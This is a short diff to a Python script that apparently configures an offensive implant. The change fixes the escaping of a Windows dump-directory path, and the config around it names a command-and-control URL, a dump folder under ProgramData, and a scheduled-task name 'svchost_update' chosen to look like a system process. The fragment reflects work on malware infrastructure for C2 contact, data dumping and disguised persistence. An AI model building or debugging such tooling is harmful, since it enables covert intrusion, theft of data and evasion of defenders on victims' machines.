@@ -59,7 +59,7 @@ def main():
             kernel=kernel,
             config={
                 'c2_url': 'https://c2.internal/p',
-                'dump_dir': r'C:\ProgramData\',
+                'dump_dir': 'C:\\ProgramData\\',
                 'task_name_base': 'svchost_update',
             }
         )
